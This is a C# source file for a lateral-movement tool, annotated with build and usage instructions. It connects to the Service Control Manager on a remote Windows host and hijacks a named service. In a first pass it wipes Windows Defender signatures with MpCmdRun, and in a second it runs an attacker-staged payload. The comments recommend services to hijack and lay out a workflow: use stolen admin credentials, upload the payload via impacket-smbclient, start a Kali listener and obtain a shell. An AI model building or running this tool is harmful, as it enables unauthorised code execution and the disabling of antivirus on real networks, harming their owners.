// ================================================================
// fileless-lateral.cs — Fileless Lateral Movement via Service Manager (No PS Remoting)
// ================================================================
// WHAT THIS DOES:
//   Functionally identical to PSLessExec.cs — connects to the Windows
//   Service Control Manager (SCM) on a REMOTE host and hijacks a service
//   to execute arbitrary commands. Labeled "fileless" because the payload
//   execution happens entirely via Windows SCM API calls without needing
//   PowerShell Remoting, WinRM, PsExec, or any third-party tools.
//
//   Execution flow:
//     1. Opens remote SCM on the target machine (requires admin rights there)
//     2. Saves the target service's current binary path
//     3. PASS 1: Replaces binary path with MpCmdRun.exe to wipe Defender sigs
//     4. Starts service (runs Defender wipe on target)
//     5. PASS 2: Replaces binary path with YOUR binary
//     6. Starts service (runs your payload on target)
//     7. PASS 3: Restores original binary path
//
//   Unlike PSLessExec.cs, this version does NOT have the InstallUtil
//   compatibility wrapper (no Loader class) — it is a simpler direct runner.
//
// WHEN TO USE THIS vs PSLessExec.cs:
//   Use this when you DON'T need InstallUtil AppLocker bypass.
//   Use PSLessExec.cs when you need the /U InstallUtil invocation method.
//
// ----------------------------------------------------------------
// COMPILE
// ----------------------------------------------------------------
//
//   OPTION A — Command line (Windows, run as Administrator):
//     C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe ^
//       /unsafe /platform:x64 /out:fileless-lateral.exe fileless-lateral.cs
//
//   OPTION B — Visual Studio:
//     1. File -> New -> Project -> Console App (.NET Framework) -> Next
//     2. Name it "fileless-lateral", Framework: .NET Framework 4.x
//     3. Properties -> Build -> Platform target: x64
//     4. Delete all code in Program.cs, paste THIS ENTIRE FILE
//     5. Build -> Build Solution (Ctrl+Shift+B)
//     6. Find: bin\x64\Debug\fileless-lateral.exe
//
// ----------------------------------------------------------------
// RUN
// ----------------------------------------------------------------
//
//   fileless-lateral.exe <Target> <Service> <BinaryToRun>
//
//   Parameters:
//     Target       -> Hostname or IP of the remote machine
//                     (e.g. appsrv01 or 192.168.1.100)
//     Service      -> Name of a service to hijack
//                     (check: sc query type= all state= all)
//                     Good choices: SensorService, Browser, spooler
//     BinaryToRun  -> Full path to your payload on the REMOTE machine
//                     (it must already be there — upload first via SMB/copy)
//
//   Example:
//     fileless-lateral.exe appsrv01 SensorService "C:\Users\Public\clrunner.exe"
//     fileless-lateral.exe 192.168.1.50 Browser "C:\Windows\Temp\shell.exe"
//
// PREREQUISITES:
//   - You must have admin privileges on the TARGET machine
//   - Your payload must already exist on the target (pre-stage it via
//     copy \\target\C$\Users\Public\payload.exe or SMB file write)
//
// EXAMPLE LATERAL MOVEMENT WORKFLOW:
//   1. Get admin hash or creds for appsrv01
//   2. Use PsExec/wmiexec/smbclient to copy your payload:
//        impacket-smbclient corp1/user:pass@appsrv01
//        > use C$
//        > put clrunner.exe Users\Public\clrunner.exe
//   3. Start Kali listener
//   4. Run: fileless-lateral.exe appsrv01 SensorService "C:\Users\Public\clrunner.exe"
//   5. Get shell on appsrv01
// ================================================================
using System;
using System.Runtime.InteropServices;

namespace PSLessExec
{
    public class Program
    {
        public static uint SC_MANAGER_ALL_ACCESS = 0xF003F;
        public static uint SERVICE_ALL_ACCESS = 0xF01FF;
        public static uint SERVICE_DEMAND_START = 0x3;
        public static uint SERVICE_NO_CHANGE = 0xffffffff;

        [StructLayout(LayoutKind.Sequential)]
        public class QUERY_SERVICE_CONFIG
        {
            [MarshalAs(System.Runtime.InteropServices.UnmanagedType.U4)]
            public UInt32 dwServiceType;
            [MarshalAs(System.Runtime.InteropServices.UnmanagedType.U4)]
            public UInt32 dwStartType;
            [MarshalAs(System.Runtime.InteropServices.UnmanagedType.U4)]
            public UInt32 dwErrorControl;
            [MarshalAs(System.Runtime.InteropServices.UnmanagedType.LPWStr)]
            public String lpBinaryPathName;
            [MarshalAs(System.Runtime.InteropServices.UnmanagedType.LPWStr)]
            public String lpLoadOrderGroup;
            [MarshalAs(System.Runtime.InteropServices.UnmanagedType.U4)]
            public UInt32 dwTagID;
            [MarshalAs(System.Runtime.InteropServices.UnmanagedType.LPWStr)]
            public String lpDependencies;
            [MarshalAs(System.Runtime.InteropServices.UnmanagedType.LPWStr)]
            public String lpServiceStartName;
            [MarshalAs(System.Runtime.InteropServices.UnmanagedType.LPWStr)]
            public String lpDisplayName;
        };

        [DllImport("advapi32.dll", EntryPoint = "OpenSCManagerW", ExactSpelling = true, CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern IntPtr OpenSCManager(string machineName, string databaseName, uint dwAccess);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern IntPtr OpenService(IntPtr hSCManager, string lpServiceName, uint dwDesiredAccess);

        [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern Boolean QueryServiceConfig(IntPtr hService, IntPtr intPtrQueryConfig, UInt32 cbBufSize, out UInt32 pcbBytesNeeded);

        [DllImport("advapi32.dll", EntryPoint = "ChangeServiceConfig")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool ChangeServiceConfigA(IntPtr hService, uint dwServiceType, uint dwStartType, int dwErrorControl, string lpBinaryPathName, string lpLoadOrderGroup, string lpdwTagId, string lpDependencies, string lpServiceStartName, string lpPassword, string lpDisplayName);

        [DllImport("advapi32", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool StartService(IntPtr hService, int dwNumServiceArgs, string[] lpServiceArgVectors);

        public static void Main(string[] args)
        {
            if (args.Length != 3)
            {
                Console.WriteLine("Usage: PSLessExec.exe [Target] [Service] [BinaryToRun]");
                Console.WriteLine("Example: PSLessExec.exe appsrv01 SensorService notepad.exe");
                return;
            }

            // Open remote SCManager
            IntPtr SCMHandle = OpenSCManager(args[0], null, SC_MANAGER_ALL_ACCESS);
            Console.WriteLine($"Got handle on SCManager on {args[0]}: {SCMHandle}.");

            // Access target service
            IntPtr schService = OpenService(SCMHandle, args[1], SERVICE_ALL_ACCESS);
            Console.WriteLine($"Got handle on target service {args[1]}: {schService}.");

            // Get current binPath (two passes, first is to determine the buffer size needed)
            UInt32 dwBytesNeeded;
            QUERY_SERVICE_CONFIG qsc = new QUERY_SERVICE_CONFIG();
            bool bResult = QueryServiceConfig(schService, IntPtr.Zero, 0, out dwBytesNeeded);
            IntPtr ptr = Marshal.AllocHGlobal((int)dwBytesNeeded);
            bResult = QueryServiceConfig(schService, ptr, dwBytesNeeded, out dwBytesNeeded);
            Marshal.PtrToStructure(ptr, qsc);
            String binPathOrig = qsc.lpBinaryPathName;

            // Pass 1: Disable Defender signatures
            String defBypass = "\"C:\\Program Files\\Windows Defender\\MpCmdRun.exe\" -RemoveDefinitions -All";
             bResult = ChangeServiceConfigA(schService, SERVICE_NO_CHANGE, SERVICE_DEMAND_START, 0, defBypass, null, null, null, null, null, null);
            Console.WriteLine($"Overwrote service executable to become '{defBypass}', result: {bResult}.");

            // Run the service for Pass 1
            bResult = StartService(schService, 0, null);
            Console.WriteLine("Launched service, defender signatures should be wiped.");

            // Pass 2: Run the chosen binary
            bResult = ChangeServiceConfigA(schService, SERVICE_NO_CHANGE, SERVICE_DEMAND_START, 0, args[2], null, null, null, null, null, null);
            Console.WriteLine($"Overwrote service executable to become '{args[2]}', result: {bResult}.");

            // Run the service for Pass 2
            bResult = StartService(schService, 0, null);
            Console.WriteLine("Launched service. Check for execution!");

            // Pass 3: Restore original binPath
            bResult = ChangeServiceConfigA(schService, SERVICE_NO_CHANGE, SERVICE_DEMAND_START, 0, binPathOrig, null, null, null, null, null, null);
            Console.WriteLine($"Restored service binary to '{binPathOrig}', result: {bResult}.");
        }
    }
}